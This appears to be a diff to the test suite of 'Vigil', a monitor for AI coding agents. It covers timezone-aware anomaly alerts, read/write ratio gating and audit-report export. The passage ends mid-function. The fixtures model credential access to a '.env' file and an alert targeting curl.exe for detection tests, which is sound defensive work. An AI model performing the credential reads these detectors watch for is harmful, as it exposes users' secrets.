@@ -16,7 +16,7 @@ import asyncio
 import json
 import sys
 import uuid
-from datetime import datetime, timedelta, timezone
+from datetime import date, datetime, timedelta, timezone
 
 import pytest
 import pytest_asyncio
@@ -25,8 +25,10 @@ import db.database as database
 from db.database import get_db
 
 from core.priors import get_prior
-from core.layer2a import check_network_destinations, check_time_anomaly
+from core.layer2a import check_network_destinations, check_ratio_anomaly, check_time_anomaly
 import core.layer2a as layer2a
+from core.layer2b import score_session_2b
+import core.layer2b as layer2b
 from core.sessions import SessionManager
 from core.baseline import Baseline
 from core.cross_agent import check_cross_agent_file_conflict
@@ -76,6 +78,17 @@ async def _make_agent(db, name: str) -> int:
     return cur.lastrowid
 
 
+async def _corroborate(db, agent_id: int, session_id: str) -> None:
+    """A credential-access event in the session: the corroborating signal a
+    time anomaly now needs before it becomes an alert (an unusual hour on its
+    own is only an info line in the report)."""
+    await db.execute(
+        "INSERT INTO events (agent_id, session_id, event_type, path) VALUES (?, ?, 'cred_access', '/x/.env')",
+        (agent_id, session_id),
+    )
+    await db.commit()
+
+
 def _uniq(label: str) -> str:
     return f"{label}_{uuid.uuid4().hex[:8]}"
 
@@ -108,19 +121,66 @@ async def test_network_destination_host_matching(test_db):
             assert fired == [], f"expected {dest!r} NOT to fire an alert, it did"
 
 
+@pytest.mark.asyncio
+async def test_ratio_anomaly_write_heavy_branch_gated_off_reads_not_observable(test_db, monkeypatch):
+    """FILE_READS_OBSERVABLE = False: the write-heavy ("wrote N but read
+    only 0") branch must never fire, since reads are never observable on
+    Windows and the check would otherwise fire on every qualifying
+    session. The read-heavy branch is untouched and must still fire."""
+    layer2a._alerter._last_fired.clear()
+
+    agent_name = _uniq("claude_code_ratiotest")
+    agent_id = await _make_agent(test_db, agent_name)
+    prior = get_prior(agent_name)
+    assert prior["read_write_ratio"]["critical"] == 25.0
+
+    write_heavy_session = _uniq("sess")
+    await test_db.execute(
+        "INSERT INTO events (agent_id, session_id, event_type, path, file_count) VALUES (?, ?, 'file_write', '/x', 30)",
+        (agent_id, write_heavy_session),
+    )
+    await test_db.commit()
+    fired = await check_ratio_anomaly(write_heavy_session, agent_id, agent_name, prior, test_db)
+    assert fired == [], "write-heavy branch must stay gated off while FILE_READS_OBSERVABLE is False"
+
+    monkeypatch.setattr(layer2a, "FILE_READS_OBSERVABLE", True)
+    fired_if_enabled = await check_ratio_anomaly(write_heavy_session, agent_id, agent_name, prior, test_db)
+    assert len(fired_if_enabled) == 1, "flipping the constant back on must restore the old behavior"
+    monkeypatch.undo()
+
+    read_heavy_session = _uniq("sess")
+    await test_db.execute(
+        "INSERT INTO events (agent_id, session_id, event_type, path, file_count) VALUES (?, ?, 'file_read', '/x', 30)",
+        (agent_id, read_heavy_session),
+    )
+    await test_db.execute(
+        "INSERT INTO events (agent_id, session_id, event_type, path, file_count) VALUES (?, ?, 'file_write', '/x', 1)",
+        (agent_id, read_heavy_session),
+    )
+    await test_db.commit()
+    fired = await check_ratio_anomaly(read_heavy_session, agent_id, agent_name, prior, test_db)
+    assert len(fired) == 1, "the read-heavy branch is untouched by this gate and must still fire"
+
+
 # ---------------------------------------------------------- 2. time anomaly
 
 @pytest.mark.asyncio
-async def test_time_anomaly_boundary(test_db):
+async def test_time_anomaly_boundary(test_db, monkeypatch):
     layer2a._alerter._last_fired.clear()
+    # Pin the local timezone to UTC so this test exercises only the hour
+    # boundary logic, independent of whatever timezone the machine running
+    # it is in.
+    monkeypatch.setattr(layer2a, "_local_tz", lambda: timezone.utc)
 
     agent_name = _uniq("claude_code_timetest")
     agent_id = await _make_agent(test_db, agent_name)
     prior = get_prior(agent_name)
     assert prior["normal_hours"] == [6, 22]
 
+    fire_session = _uniq("sess")
+    await _corroborate(test_db, agent_id, fire_session)
     fires = await check_time_anomaly(
-        _uniq("sess"), agent_id, agent_name, "2026-01-01 22:30:00", prior, test_db,
+        fire_session, agent_id, agent_name, "2026-01-01 22:30:00", prior, test_db,
     )
     assert len(fires) == 1, "22:30 (hour == normal_hours upper bound) should fire"
 
@@ -128,6 +188,51 @@ async def test_time_anomaly_boundary(test_db):
         _uniq("sess"), agent_id, agent_name, "2026-01-01 21:59:00", prior, test_db,
     )
     assert no_fire == [], "21:59 (still inside normal hours) should not fire"
+
+
+@pytest.mark.asyncio
+async def test_time_anomaly_respects_local_timezone(test_db, monkeypatch):
+    """The actual bug: a session at 05:34 UTC is 11:04 AM in Pune
+    (UTC+5:30), a normal working hour, and must not fire. A session at
+    22:00 UTC is 03:30 AM in Pune, outside normal hours, and must fire
+    with the local time in its title. A UTC-pinned run must behave exactly
+    as before (unchanged at this specific boundary)."""
+    layer2a._alerter._last_fired.clear()
+    kolkata = timezone(timedelta(hours=5, minutes=30))
+
+    agent_name = _uniq("claude_code_tztest")
+    agent_id = await _make_agent(test_db, agent_name)
+    prior = get_prior(agent_name)
+    assert prior["normal_hours"] == [6, 22]
+
+    monkeypatch.setattr(layer2a, "_local_tz", lambda: kolkata)
+
+    no_fire = await check_time_anomaly(
+        _uniq("sess"), agent_id, agent_name, "2026-01-01 05:34:00", prior, test_db,
+    )
+    assert no_fire == [], "05:34 UTC is 11:04 AM in Asia/Kolkata, inside normal hours"
+
+    kolkata_session = _uniq("sess")
+    await _corroborate(test_db, agent_id, kolkata_session)
+    fires = await check_time_anomaly(
+        kolkata_session, agent_id, agent_name, "2026-01-01 22:00:00", prior, test_db,
+    )
+    assert len(fires) == 1, "22:00 UTC is 03:30 AM in Asia/Kolkata, outside normal hours"
+
+    alert = await test_db.execute(
+        "SELECT title FROM alerts WHERE id = ?", (fires[0],)
+    )
+    title = (await alert.fetchone())["title"]
+    assert "3:30 AM" in title, f"expected local time 3:30 AM in title, got: {title!r}"
+
+    monkeypatch.setattr(layer2a, "_local_tz", lambda: timezone.utc)
+
+    utc_session = _uniq("sess")
+    await _corroborate(test_db, agent_id, utc_session)
+    fires_utc = await check_time_anomaly(
+        utc_session, agent_id, agent_name, "2026-01-01 22:30:00", prior, test_db,
+    )
+    assert len(fires_utc) == 1, "with tz pinned to UTC, 22:30 behaves exactly as before"
 
 
 # --------------------------------------------------------- 3. session close
@@ -138,8 +243,9 @@ class _NoopBaseline:
 
 
 @pytest.mark.asyncio
-async def test_close_idle_sessions_alert_count_and_summary(test_db):
+async def test_close_idle_sessions_alert_count_and_summary(test_db, monkeypatch):
     layer2a._alerter._last_fired.clear()
+    monkeypatch.setattr(layer2a, "_local_tz", lambda: timezone.utc)
 
     agent_name = _uniq("claude_code_closetest")
     agent_id = await _make_agent(test_db, agent_name)
@@ -159,6 +265,7 @@ async def test_close_idle_sessions_alert_count_and_summary(test_db):
         (agent_id, session_id, "/tmp/whatever.py"),
     )
     await test_db.commit()
+    await _corroborate(test_db, agent_id, session_id)
 
     sm = SessionManager()
     sm._active[agent_id] = {
@@ -275,8 +382,9 @@ async def test_recover_orphaned_sessions_bad_row_does_not_abort(test_db, monkeyp
 
 
 @pytest.mark.asyncio
-async def test_recover_orphaned_sessions_scores(test_db):
+async def test_recover_orphaned_sessions_scores(test_db, monkeypatch):
     layer2a._alerter._last_fired.clear()
+    monkeypatch.setattr(layer2a, "_local_tz", lambda: timezone.utc)
 
     agent_name = _uniq("claude_code_recoverscoretest")
     agent_id = await _make_agent(test_db, agent_name)
@@ -289,6 +397,7 @@ async def test_recover_orphaned_sessions_scores(test_db):
         (session_id, agent_id, "2026-01-01 22:30:00"),
     )
     await test_db.commit()
+    await _corroborate(test_db, agent_id, session_id)
 
     sm = SessionManager()
     count = await sm.recover_orphaned_sessions(_NoopBaseline())
@@ -450,6 +559,695 @@ def test_export_invalid_date_returns_400():
     assert resp.status_code == 400
 
 
+def test_export_format_local_converts_utc_to_local_with_offset():
+    """The PDF 'Generated:' header and session start times used to print
+    the raw UTC isoformat string (e.g. 2026-10-06T07:04:20.950145+00:00).
+    _format_local must convert to local time and label it, for both a
+    naive-UTC DB timestamp and an isoformat string with an explicit
+    offset (generated_at)."""
+    from datetime import datetime, timedelta, timezone
+    from unittest.mock import patch
+
+    import api.export as export_module
+
+    # The conversion uses the machine's local zone (datetime.astimezone() with no argument), which is
+    # UTC on a CI runner. Pin a fixed +05:30 local zone so the test does not depend on the OS zone.
+    class _Plus0530(datetime):
+        def astimezone(self, tz=None):
+            return super().astimezone(tz or timezone(timedelta(hours=5, minutes=30)))
+
+    with patch.object(export_module, "datetime", _Plus0530):
+        naive_result = export_module._format_local("2026-01-01 22:30:00")
+        offset_result = export_module._format_local("2026-01-01T22:30:00.123456+00:00")
+        other_offset = export_module._format_local("2026-01-01T22:30:00-04:00")
+
+    assert naive_result == "2026-01-02 04:00:00"        # 22:30 UTC is 04:00 the next day at +05:30
+    assert offset_result == "2026-01-02 04:00:00"
+    assert other_offset == "2026-01-02 08:00:00"         # 22:30 at -04:00 is 02:30 UTC on the 2nd, 08:00 at +05:30
+
+
+def test_export_pdf_header_shows_period_not_the_word_today():
+    """export_pdf's header printed "Date: today" literally when called
+    with no date= param, because summary['date'] is the raw query string
+    ("today" by default), never resolved to an actual calendar date for
+    display. The header is now a "Period: <start> to <end> <zone>" line
+    built from the resolved local-day boundaries, never the literal word
+    "today". The PDF's text is inside a compressed content stream, so
+    this patches Canvas.drawString to capture exactly what was drawn
+    instead of trying to parse the PDF bytes."""
+    from datetime import datetime
+    from unittest.mock import patch
+
+    from fastapi import FastAPI
+    from fastapi.testclient import TestClient
+    from reportlab.pdfgen import canvas
+
+    from api.export import router as export_router
+
+    app = FastAPI()
+    app.include_router(export_router)
+    client = TestClient(app)
+
+    drawn = []
+    original = canvas.Canvas.drawString
+
+    def capture(self, x, y, text):
+        drawn.append(text)
+        return original(self, x, y, text)
+
+    with patch.object(canvas.Canvas, "drawString", capture):
+        resp = client.get("/export/pdf")
+    assert resp.status_code == 200
+
+    period_lines = [t for t in drawn if t.startswith("Period:")]
+    assert len(period_lines) == 1, f"expected exactly one 'Period:' line, got {period_lines!r}"
+    assert "today" not in period_lines[0], f"header still shows the literal word 'today': {period_lines[0]!r}"
+
+    today_local = datetime.now().astimezone().date()
+    assert today_local.strftime("%d %b %Y") in period_lines[0], (
+        f"expected today's real local date in {period_lines[0]!r}"
+    )
+
+    assert any(t == "Vigil Audit Report" for t in drawn)
+
+
+class _FixedDatetime(datetime):
+    """datetime.now(tz) frozen to a fixed real moment, for deterministic
+    local-day tests. Windows has no time.tzset() to actually change the
+    process's effective local timezone, so export.py's _resolve_local_day/
+    _local_day_bounds_utc take an explicit tz parameter instead -- this
+    class only needs to fix "now" itself, not fake a system timezone."""
+    _fixed = None
+
+    @classmethod
+    def now(cls, tz=None):
+        if tz is not None:
+            return cls._fixed.astimezone(tz)
+        return cls._fixed
+
+
+def test_resolve_local_day_ist_at_2am_reports_local_day_not_utc_day(monkeypatch):
+    """At 02:00 IST, UTC is still the previous calendar day (IST is
+    UTC+5:30, so IST midnight is 18:30 UTC the day before). "today" must
+    resolve to the LOCAL day (the one a person in that timezone is
+    actually living in), not whatever day it is in UTC at that instant."""
+    from zoneinfo import ZoneInfo
+
+    import api.export as export_module
+
+    ist = ZoneInfo("Asia/Kolkata")
+    fixed_now = datetime(2026, 10, 7, 2, 0, 0, tzinfo=ist)  # 2026-10-06 20:30 UTC
+    assert fixed_now.astimezone(timezone.utc).date() == date(2026, 10, 6), (
+        "sanity check: at this instant UTC's calendar date really is the day before IST's"
+    )
+
+    _FixedDatetime._fixed = fixed_now
+    monkeypatch.setattr(export_module, "datetime", _FixedDatetime)
+
+    day = export_module._resolve_local_day("today", tz=ist)
+    assert day == date(2026, 10, 7), "the IST calendar day, not UTC's 2026-10-06"
+
+    start_utc, end_utc = export_module._local_day_bounds_utc(day, tz=ist)
+    assert start_utc == datetime(2026, 10, 6, 18, 30, tzinfo=timezone.utc)
+    assert end_utc == datetime(2026, 10, 7, 18, 30, tzinfo=timezone.utc)
+
+
+def test_local_day_bounds_utc_handles_us_dst_transition_day():
+    """A day containing a DST transition is 23 or 25 real hours, not 24 --
+    _local_day_bounds_utc must compute the end boundary from the next
+    calendar DATE, not by adding a fixed 24-hour timedelta, or the period
+    would be off by an hour on exactly these days. Finds a real
+    transition day in America/New_York empirically (rather than hardcoding
+    one) so this doesn't silently stop testing anything if the date of a
+    future year's transition is ever assumed wrong."""
+    from zoneinfo import ZoneInfo
+
+    import api.export as export_module
+
+    ny = ZoneInfo("America/New_York")
+
+    def utc_offset_at_midnight(d):
+        return datetime(d.year, d.month, d.day, tzinfo=ny).utcoffset()
+
+    transition_day = None
+    d = date(2026, 1, 1)
+    for _ in range(366):
+        next_d = d + timedelta(days=1)
+        if utc_offset_at_midnight(d) != utc_offset_at_midnight(next_d):
+            transition_day = d
+            break
+        d = next_d
+    assert transition_day is not None, "could not find a DST transition day in 2026 for America/New_York"
+
+    start_utc, end_utc = export_module._local_day_bounds_utc(transition_day, tz=ny)
+    duration = end_utc - start_utc
+    assert duration != timedelta(hours=24), (
+        f"transition day {transition_day} must not be exactly 24 hours, got {duration}"
+    )
+    assert duration in (timedelta(hours=23), timedelta(hours=25)), (
+        f"expected a 23 or 25 hour day, got {duration}"
+    )
+
+
+def test_resolve_local_day_with_explicit_date_ignores_tz_and_now():
+    """An explicit date=YYYY-MM-DD is parsed directly regardless of
+    timezone or the current moment -- only the "today" sentinel needs
+    local-day resolution at all."""
+    from zoneinfo import ZoneInfo
+
+    import api.export as export_module
+
+    day = export_module._resolve_local_day("2026-03-15", tz=ZoneInfo("America/New_York"))
+    assert day == date(2026, 3, 15)
+
+
+def test_resolve_local_day_utc_unchanged(monkeypatch):
+    """A UTC-based machine (tz=timezone.utc, no DST ever) must behave
+    exactly as the original, pre-local-day-fix code did: "today" is
+    UTC's current date, and a day's bounds span exactly 24 hours."""
+    import api.export as export_module
+
+    fixed_now = datetime(2026, 6, 15, 10, 0, 0, tzinfo=timezone.utc)
+    _FixedDatetime._fixed = fixed_now
+    monkeypatch.setattr(export_module, "datetime", _FixedDatetime)
+
+    day = export_module._resolve_local_day("today", tz=timezone.utc)
+    assert day == date(2026, 6, 15)
+
+    start_utc, end_utc = export_module._local_day_bounds_utc(day, tz=timezone.utc)
+    assert start_utc == datetime(2026, 6, 15, 0, 0, tzinfo=timezone.utc)
+    assert end_utc == datetime(2026, 6, 16, 0, 0, tzinfo=timezone.utc)
+    assert end_utc - start_utc == timedelta(hours=24)
+
+
+def test_wrap_line_handles_very_long_zone_name():
+    """_wrap_line must split a line that is too wide for the printable
+    page width into multiple lines, each one individually measuring
+    within that width -- using reportlab's own stringWidth, not a
+    guessed character count, since different fonts/sizes render the
+    same text at different widths. Uses a deliberately long fake zone
+    name (longer than any real one) rather than this machine's actual
+    timezone, which varies by machine and isn't reliably long enough to
+    exercise wrapping on its own."""
+    from reportlab.lib.pagesizes import letter
+    from reportlab.lib.units import inch
+    from reportlab.pdfbase.pdfmetrics import stringWidth
+
+    import api.export as export_module
+
+    max_width = letter[0] - 2 * inch
+    long_zone_name = "Pacific Extremely Long Fictional Standard Time For Wrap Testing Purposes Only"
+    text = f"Period: 07 Oct 2026 00:00 to 08 Oct 2026 00:00 {long_zone_name}"
+
+    lines = export_module._wrap_line(text, "Helvetica", 10, max_width)
+
+    assert len(lines) > 1, "expected this deliberately long line to actually wrap"
+    for line in lines:
+        assert stringWidth(line, "Helvetica", 10) <= max_width, (
+            f"wrapped line exceeds printable width: {line!r}"
+        )
+    # no words lost or reordered by wrapping
+    assert " ".join(lines) == text
+
+
+@pytest.mark.asyncio
+async def test_export_pdf_no_drawn_line_exceeds_printable_width(test_db):
+    """End-to-end: seeds a session with a long operator/hostname and an
+    alert with a very long title, then renders the real PDF and checks
+    every single drawString call reportlab actually made -- header,
+    sessions, and alerts alike -- against the same max_width the PDF
+    itself is laid out with. Captures the real font/size active on the
+    canvas at each draw call (Canvas._fontname/_fontsize) since width
+    depends on both, not just the text."""
+    from unittest.mock import patch
+
+    from fastapi import FastAPI
+    from fastapi.testclient import TestClient
+    from reportlab.lib.pagesizes import letter
+    from reportlab.lib.units import inch
+    from reportlab.pdfbase.pdfmetrics import stringWidth
+    from reportlab.pdfgen import canvas
+
+    from api.export import router as export_router
+
+    agent_name = _uniq("claude_code_pdfwraptest")
+    agent_id = await _make_agent(test_db, agent_name)
+    session_id = _uniq("sess")
+    long_hostname = "a-very-long-workstation-hostname-" + "x" * 80
+    await test_db.execute(
+        "INSERT INTO sessions (id, agent_id, started_at, ended_at, operator_username, operator_hostname) "
+        "VALUES (?, ?, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, ?, ?)",
+        (session_id, agent_id, "a_very_long_operator_username_" + "y" * 80, long_hostname),
+    )
+    long_title = "Critical alert: " + "suspicious activity detected in a path " * 15
+    await test_db.execute(
+        "INSERT INTO alerts (agent_id, severity, title, description, status, rule_type) "
+        "VALUES (?, 'critical', ?, 'd', 'open', 'policy')",
+        (agent_id, long_title),
+    )
+    await test_db.commit()
+
+    app = FastAPI()
+    app.include_router(export_router)
+    client = TestClient(app)
+
+    max_width = letter[0] - 2 * inch
+    captured = []
+    original = canvas.Canvas.drawString
+
+    def capture(self, x, y, text):
+        captured.append((text, self._fontname, self._fontsize))
+        return original(self, x, y, text)
+
+    with patch.object(canvas.Canvas, "drawString", capture):
+        resp = client.get("/export/pdf")
+    assert resp.status_code == 200
+    assert len(captured) > 0
+
+    overflowing = [
+        (text, font, size, stringWidth(text, font, size))
+        for text, font, size in captured
+        if stringWidth(text, font, size) > max_width
+    ]
+    assert overflowing == [], f"drawn line(s) exceed printable width {max_width}: {overflowing}"
+
+    # the long alert title must still appear in full somewhere across the
+    # wrapped lines, not silently truncated the way line[:110] used to.
+    joined = " ".join(text for text, _, _ in captured)
+    assert "suspicious activity detected in a path" in joined
+
+
+def test_format_duration_under_and_over_an_hour():
+    from api.export import _format_duration
+
+    assert _format_duration(45) == "0m 45s"
+    assert _format_duration(125) == "2m 5s"
+    assert _format_duration(3599) == "59m 59s"
+    assert _format_duration(3600) == "1h 0m"
+    assert _format_duration(80164) == "22h 16m"
+
+
+def test_utc_offset_label_formats_positive_and_negative():
+    from api.export import _utc_offset_label
+
+    ist = datetime(2026, 1, 1, tzinfo=timezone(timedelta(hours=5, minutes=30)))
+    assert _utc_offset_label(ist) == "UTC+05:30"
+
+    behind = datetime(2026, 1, 1, tzinfo=timezone(timedelta(hours=-4)))
+    assert _utc_offset_label(behind) == "UTC-04:00"
+
+    utc = datetime(2026, 1, 1, tzinfo=timezone.utc)
+    assert _utc_offset_label(utc) == "UTC+00:00"
+
+
+@pytest.mark.asyncio
+async def test_export_folds_no_activity_sessions_pdf_and_json(test_db):
+    """A session with started_at == ended_at and zero events this period
+    is folded into one count line in the PDF and the summary line, but
+    the JSON keeps every session with a no_activity flag on it. A normal
+    session with real activity is listed individually with its agent
+    name and period event count."""
+    import re
+    from unittest.mock import patch
+
+    from fastapi import FastAPI
+    from fastapi.testclient import TestClient
+    from reportlab.pdfgen import canvas
+
+    from api.export import router as export_router
+
+    agent_name = _uniq("claude_code_noactivitytest")
+    agent_id = await _make_agent(test_db, agent_name)
+
+    # The PDF prints only the first 8 characters of a session id. _uniq("sess") has just 3 random
+    # characters in those 8 ("sess_" + 3 hex), so with the 30 or more sessions other tests leave in the
+    # shared database, an unrelated session can print the same 8 characters (1 in ~4000 per session).
+    # Real session ids are uuids: use the first 8 hex digits (4 billion values) as the marker.
+    real_session_id = str(uuid.uuid4())
+    await test_db.execute(
+        "INSERT INTO sessions (id, agent_id, started_at, ended_at) VALUES (?, ?, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)",
+        (real_session_id, agent_id),
+    )
+    await test_db.execute(
+        "INSERT INTO events (agent_id, session_id, event_type, path) VALUES (?, ?, 'file_write', '/tmp/x.py')",
+        (agent_id, real_session_id),
+    )
+
+    empty_session_id = str(uuid.uuid4())
+    await test_db.execute(
+        "INSERT INTO sessions (id, agent_id, started_at, ended_at) VALUES (?, ?, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)",
+        (empty_session_id, agent_id),
+    )
+    await test_db.commit()
+
+    app = FastAPI()
+    app.include_router(export_router)
+    client = TestClient(app)
+
+    json_resp = client.get("/export/json")
+    assert json_resp.status_code == 200
+    by_id = {s["id"]: s for s in json_resp.json()["sessions"]}
+    assert by_id[real_session_id]["no_activity"] is False
+    assert by_id[real_session_id]["event_count_in_period"] == 1
+    assert by_id[real_session_id]["agent_name"] == agent_name
+    assert by_id[empty_session_id]["no_activity"] is True
+    assert by_id[empty_session_id]["event_count_in_period"] == 0
+
+    drawn = []
+    original = canvas.Canvas.drawString
+
+    def capture(self, x, y, text):
+        drawn.append(text)
+        return original(self, x, y, text)
+
+    with patch.object(canvas.Canvas, "drawString", capture):
+        pdf_resp = client.get("/export/pdf")
+    assert pdf_resp.status_code == 200
+
+    joined = " ".join(drawn)
+    # Counts are checked as "at least this test's own contribution", not
+    # an exact match -- another test earlier in the same shared DB can
+    # leave its own no-activity session behind (started_at == ended_at,
+    # no events), which would otherwise make an exact count fragile to
+    # execution order.
+    fold_match = re.search(r"(\d+) sessions? with no recorded activity", joined)
+    assert fold_match is not None and int(fold_match.group(1)) >= 1
+    summary_match = re.search(r"\(\+(\d+) with no recorded activity\)", joined)
+    assert summary_match is not None and int(summary_match.group(1)) >= 1
+    assert f"agent={agent_name}" in joined
+    assert "events=1" in joined
+    # the real session is listed individually by its id prefix; the empty one's must never appear
+    assert real_session_id[:8] in joined
+    assert empty_session_id[:8] not in joined
+
+
+@pytest.mark.asyncio
+async def test_export_pdf_alert_line_prefixed_with_time_and_session(test_db):
+    """Superseded by grouping (see test_export_pdf_groups_alerts_by_session):
+    an alert with a session_id no longer carries its own time/session
+    prefix -- that moved to the group's header line, shared by every
+    alert in the group. This test now checks the header carries the
+    session id and a local time, and the alert's own line still carries
+    its severity and title."""
+    from unittest.mock import patch
+
+    from fastapi import FastAPI
+    from fastapi.testclient import TestClient
+    from reportlab.pdfgen import canvas
+
+    from api.export import router as export_router
+
+    agent_name = _uniq("claude_code_alertprefixtest")
+    agent_id = await _make_agent(test_db, agent_name)
+    session_id = _uniq("sess")
+    await test_db.execute(
+        "INSERT INTO alerts (agent_id, severity, title, description, status, rule_type, session_id) "
+        "VALUES (?, 'critical', 'prefix test alert', 'd', 'open', 'policy', ?)",
+        (agent_id, session_id),
+    )
+    await test_db.commit()
+
+    app = FastAPI()
+    app.include_router(export_router)
+    client = TestClient(app)
+
+    drawn = []
+    original = canvas.Canvas.drawString
+
+    def capture(self, x, y, text):
+        drawn.append(text)
+        return original(self, x, y, text)
+
+    with patch.object(canvas.Canvas, "drawString", capture):
+        resp = client.get("/export/pdf")
+    assert resp.status_code == 200
+
+    header_idx = next(i for i, t in enumerate(drawn) if t.startswith(f"Session {session_id[:8]}"))
+    header_window = " ".join(drawn[header_idx:header_idx + 6])
+    assert "detected" in header_window
+
+    alert_lines = [t for t in drawn if "prefix test alert" in t]
+    assert len(alert_lines) == 1
+    assert alert_lines[0] == "[CRITICAL] prefix test alert (status=open)"
+
+
+@pytest.mark.asyncio
+async def test_export_sessions_overlap_period_not_just_start_inside_it(test_db):
+    """A session that started before today and is still running (or only
+    just ended) this morning has real events inside today's report -- it
+    must be listed even though its own started_at isn't inside today's
+    window. A session that's fully before or fully after the period must
+    not appear. Uses tz=timezone.utc so "today" is deterministic
+    regardless of this machine's real timezone."""
+    import api.export as export_module
+
+    agent_name = _uniq("claude_code_overlaptest")
+    agent_id = await _make_agent(test_db, agent_name)
+
+    # Spans midnight: started well before today, still open.
+    spanning_id = _uniq("sess")
+    await test_db.execute(
+        "INSERT INTO sessions (id, agent_id, started_at, ended_at) VALUES (?, ?, ?, NULL)",
+        (spanning_id, agent_id, "2026-03-14 20:00:00"),
+    )
+    # Fully before the period: ended before today started.
+    before_id = _uniq("sess")
+    await test_db.execute(
+        "INSERT INTO sessions (id, agent_id, started_at, ended_at) VALUES (?, ?, ?, ?)",
+        (before_id, agent_id, "2026-03-13 10:00:00", "2026-03-13 11:00:00"),
+    )
+    # Fully after the period: starts tomorrow.
+    after_id = _uniq("sess")
+    await test_db.execute(
+        "INSERT INTO sessions (id, agent_id, started_at, ended_at) VALUES (?, ?, ?, ?)",
+        (after_id, agent_id, "2026-03-16 01:00:00", "2026-03-16 02:00:00"),
+    )
+    # Started inside the period (the ordinary case, must still work).
+    inside_id = _uniq("sess")
+    await test_db.execute(
+        "INSERT INTO sessions (id, agent_id, started_at, ended_at) VALUES (?, ?, ?, ?)",
+        (inside_id, agent_id, "2026-03-15 08:00:00", "2026-03-15 09:00:00"),
+    )
+    await test_db.commit()
+
+    summary = await export_module._build_summary("2026-03-15", tz=timezone.utc)
+    # Scoped to this test's own agent_id -- the shared test DB can carry
+    # sessions from other tests/runs, so asserting on the full returned
+    # list's size would be fragile to data this test never created.
+    my_sessions = [s for s in summary["sessions"] if s["agent_id"] == agent_id]
+    my_session_ids = {s["id"] for s in my_sessions}
+
+    assert spanning_id in my_session_ids, "a session spanning midnight into this period must be listed"
+    assert inside_id in my_session_ids, "a session that started inside the period must still be listed"
+    assert before_id not in my_session_ids, "a session fully before the period must not be listed"
+    assert after_id not in my_session_ids, "a session fully after the period must not be listed"
+
+    # the summary counts must match what's actually in the list, for this
+    # test's own agent: exactly the spanning and inside sessions.
+    assert my_session_ids == {spanning_id, inside_id}
+
+
+@pytest.mark.asyncio
+async def test_export_pdf_marks_sessions_that_began_before_the_period(test_db):
+    """The spanning-midnight session's PDF line must show both started
+    and ended in local time and the "(began before this period)" marker;
+    a session that started inside the period must not get that marker."""
+    from unittest.mock import patch
+
+    from fastapi import FastAPI
+    from fastapi.testclient import TestClient
+    from reportlab.pdfgen import canvas
+
+    import api.export as export_module
+    from api.export import router as export_router
+
+    async def fake_build_summary(date, tz=None):
+        return {
+            "date": "2026-03-15",
+            "generated_at": "2026-03-15T12:00:00+00:00",
+            "period_start": "2026-03-15T00:00:00+00:00",
+            "period_end": "2026-03-16T00:00:00+00:00",
+            "timezone": "UTC",
+            "event_count": 0,
+            "sessions": [
+                {
+                    "id": "spanning-session-id",
+                    "started_at": "2026-03-14 20:00:00",
+                    "ended_at": None,
+                    "operator_username": "alice",
+                    "operator_hostname": "alice-pc",
+                    "agent_name": "claude_code",
+                    "event_count_in_period": 3,
+                    "no_activity": False,
+                    "resumed": False,
+                },
+                {
+                    "id": "inside-session-id",
+                    "started_at": "2026-03-15 08:00:00",
+                    "ended_at": "2026-03-15 09:00:00",
+                    "operator_username": "bob",
+                    "operator_hostname": "bob-pc",
+                    "agent_name": "codex",
+                    "event_count_in_period": 1,
+                    "no_activity": False,
+                    "resumed": False,
+                },
+            ],
+            "alerts": [],
+            "report_notes": export_module.REPORT_NOTES,
+            "coverage_available": False,
+            "tracking_started_at": None,
+            "active_seconds": 0,
+            "period_seconds_measured": 0,
+            "gaps": [],
+            "short_gap_count": 0,
+            "short_gap_seconds": 0,
+        }
+
+    app = FastAPI()
+    app.include_router(export_router)
+    client = TestClient(app)
+
+    drawn = []
+    original = canvas.Canvas.drawString
+
+    def capture(self, x, y, text):
+        drawn.append(text)
+        return original(self, x, y, text)
+
+    with patch.object(export_module, "_build_summary", fake_build_summary), \
+         patch.object(canvas.Canvas, "drawString", capture):
+        resp = client.get("/export/pdf")
+    assert resp.status_code == 200
+
+    # The marker phrase itself can be split across two wrapped sub-lines
+    # (confirmed: on this machine the long local zone name pushes
+    # "(began before" onto one line and "this period)" onto the next),
+    # so join everything drawn before checking for it as a phrase.
+    joined = " ".join(drawn)
+    assert joined.count("(began before this period)") == 1, (
+        "exactly the spanning session should get the marker, not the one that started inside"
+    )
+    assert "ended=ongoing" in joined
+
+
+@pytest.mark.asyncio
+async def test_export_json_includes_report_notes():
+    from fastapi import FastAPI
+    from fastapi.testclient import TestClient
+
+    import api.export as export_module
+    from api.export import router as export_router
+
+    app = FastAPI()
+    app.include_router(export_router)
+    client = TestClient(app)
+
+    resp = client.get("/export/json")
+    assert resp.status_code == 200
+    data = resp.json()
+    # Network and MCP monitoring are off in tests (no scheduler bound), so
+    # their two "not monitored" notes, the watched-folders scope note and
+    # the attribution note follow the 9 fixed notes.
+    assert data["report_notes"] == export_module.current_report_notes()
+    assert data["report_notes"][:9] == export_module.REPORT_NOTES
+    assert len(data["report_notes"]) == 13
+    assert any("[REDACTED]" in n and "best-effort" in n for n in data["report_notes"])
+    assert not any("not its exact command text" in n for n in data["report_notes"])
+
+
+def _pdf_drawn_lines_for_alerts(alerts):
+    from unittest.mock import patch
+
+    from fastapi import FastAPI
+    from fastapi.testclient import TestClient
+    from reportlab.pdfgen import canvas
+
+    import api.export as export_module
+    from api.export import router as export_router
+
+    async def fake_build_summary(date, tz=None):
+        return {
+            "date": "2026-03-15", "generated_at": "2026-03-15T12:00:00+00:00",
+            "period_start": "2026-03-15T00:00:00+00:00", "period_end": "2026-03-16T00:00:00+00:00",
+            "timezone": "UTC", "event_count": 0, "sessions": [], "alerts": alerts,
+            "report_notes": export_module.REPORT_NOTES, "coverage_available": False,
+            "tracking_started_at": None, "active_seconds": 0, "period_seconds_measured": 0,
+            "gaps": [], "short_gap_count": 0, "short_gap_seconds": 0,
+        }
+
+    drawn = []
+    original = canvas.Canvas.drawString
+
+    def capture(self, x, y, text):
+        drawn.append(text)
+        return original(self, x, y, text)
+
+    app = FastAPI()
+    app.include_router(export_router)
+    client = TestClient(app)
+    with patch.object(export_module, "_build_summary", fake_build_summary), \
+         patch.object(canvas.Canvas, "drawString", capture):
+        assert client.get("/export/pdf").status_code == 200
+    return drawn
+
+
+def _alert(reason, title, description, **kw):
+    return {
+        "id": 1, "severity": "low", "title": title, "description": description,
+        "status": "open", "reason": reason, "target": "curl.exe", "session_id": None,
